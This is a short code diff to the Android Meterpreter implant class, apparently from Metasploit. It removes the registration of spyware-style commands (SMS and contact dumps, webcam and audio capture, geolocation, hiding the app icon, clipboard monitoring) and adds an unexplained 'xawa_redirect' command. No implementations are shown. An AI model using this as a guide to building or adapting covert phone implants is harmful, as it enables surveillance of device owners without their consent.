@@ -137,37 +137,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GETPID, stdapi_sys_process_getpid_android.class);
         mgr.registerCommand(CommandId.STDAPI_UI_DESKTOP_SCREENSHOT, stdapi_ui_desktop_screenshot.class);
         if (context != null) {
-            mgr.registerCommand(CommandId.APPAPI_APP_LIST, appapi_app_list.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_RUN, appapi_app_run.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, appapi_app_install.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, appapi_app_uninstall.class);
-            mgr.registerCommand(CommandId.STDAPI_WEBCAM_AUDIO_RECORD, stdapi_webcam_audio_record_android.class);
-            mgr.registerCommand(CommandId.STDAPI_WEBCAM_LIST, webcam_list_android.class);
-            mgr.registerCommand(CommandId.STDAPI_WEBCAM_START, webcam_start_android.class);
-            mgr.registerCommand(CommandId.STDAPI_WEBCAM_STOP, webcam_stop_android.class);
-            mgr.registerCommand(CommandId.STDAPI_WEBCAM_GET_FRAME, webcam_get_frame_android.class);
-            mgr.registerCommand(CommandId.ANDROID_SEND_SMS, android_send_sms.class);
-            mgr.registerCommand(CommandId.ANDROID_DUMP_SMS, android_dump_sms.class);
-            mgr.registerCommand(CommandId.ANDROID_DUMP_CONTACTS, android_dump_contacts.class);
-            mgr.registerCommand(CommandId.ANDROID_DUMP_CALLLOG, android_dump_calllog.class);
-            mgr.registerCommand(CommandId.ANDROID_CHECK_ROOT, android_check_root.class);
-            mgr.registerCommand(CommandId.ANDROID_GEOLOCATE, android_geolocate.class);
-            mgr.registerCommand(CommandId.ANDROID_WLAN_GEOLOCATE, android_wlan_geolocate.class);
-            mgr.registerCommand(CommandId.ANDROID_INTERVAL_COLLECT, android_interval_collect.class);
-            mgr.registerCommand(CommandId.ANDROID_ACTIVITY_START, android_activity_start.class);
-            mgr.registerCommand(CommandId.ANDROID_HIDE_APP_ICON, android_hide_app_icon.class);
-            mgr.registerCommand(CommandId.ANDROID_SET_AUDIO_MODE, android_set_audio_mode.class);
-            mgr.registerCommand(CommandId.ANDROID_SQLITE_QUERY, android_sqlite_query.class);
-            mgr.registerCommand(CommandId.ANDROID_WAKELOCK, android_wakelock.class);
-            mgr.registerCommand(CommandId.ANDROID_SET_WALLPAPER, android_set_wallpaper.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_GET_DATA, clipboard_get_data.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_SET_DATA, clipboard_set_data.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_DUMP, clipboard_monitor_dump.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_PAUSE, clipboard_monitor_pause.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_PURGE, clipboard_monitor_purge.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_RESUME, clipboard_monitor_resume.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_START, clipboard_monitor_start.class);
-            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_STOP, clipboard_monitor_stop.class);
+            mgr.registerCommand(CommandId.XAWA_REDIRECT, xawa_redirect.class);
         }
         return getCommandManager().getNewCommandIds();
     }
